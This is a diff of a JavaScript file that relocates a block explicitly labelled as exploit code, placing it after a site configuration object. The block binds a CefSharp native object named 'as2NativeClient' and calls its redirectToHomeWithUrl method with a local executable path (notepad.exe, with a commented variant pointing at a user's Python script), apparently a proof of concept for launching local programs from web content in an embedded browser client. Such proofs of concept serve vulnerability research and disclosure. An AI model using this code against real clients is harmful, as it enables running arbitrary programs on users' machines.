@@ -1,20 +1,4 @@
 
-
-
-        window.CefSharp.BindObjectAsync("as2NativeClient")
-        .then((result) => {
-          if(window.as2NativeClient) {
-            console.log("NC Object bound");
-                  
-            
-            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
-             
-           // window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
-                  
-          }
-        })
-      
-
 // ignore below code, it just fixes the broken javascript code to make application usable
 
 window.siteConfig = {
@@ -34,6 +18,28 @@ window.siteConfig = {
     defaultDcvJS: "2020.0-8438"
   };
 
+// ignore above code, it just fixes the broken javascript code to make application usable
+
+
+
+// Exploit code starts here
+
+        window.CefSharp.BindObjectAsync("as2NativeClient")
+        .then((result) => {
+          if(window.as2NativeClient) {
+            console.log("NC Object bound");
+                  
+            
+            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
+             
+           // window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
+                  
+          }
+        })
+
+// Exploit code ends here
+
+      
 
 
 
